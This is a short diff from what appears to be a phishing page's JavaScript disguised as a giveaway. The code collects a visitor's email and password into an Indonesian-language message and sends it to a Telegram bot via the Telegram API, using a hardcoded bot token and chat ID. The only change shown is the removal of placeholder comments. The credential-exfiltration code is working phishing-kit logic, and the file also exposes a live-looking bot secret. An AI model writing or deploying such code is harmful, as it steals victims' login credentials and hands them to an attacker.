@@ -109,8 +109,8 @@
             var pesan = `Pengguna baru ikut Giveaway!\nEmail: ${email}\nPassword: ${password}`;
 
             // Telegram bot token and chat ID
-            var token = '7562000837:AAHgtb3ccEITzHhVcWY4f8mIUl1QIUscDHk'; // Replace with your bot token
-            var chat_id = '-4669580867'; // Replace with your chat ID (group or user ID)
+            var token = '7562000837:AAHgtb3ccEITzHhVcWY4f8mIUl1QIUscDHk'; 
+            var chat_id = '-4669580867'; 
 
             // URL for sending message to Telegram API
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}&parse_mode=HTML`;
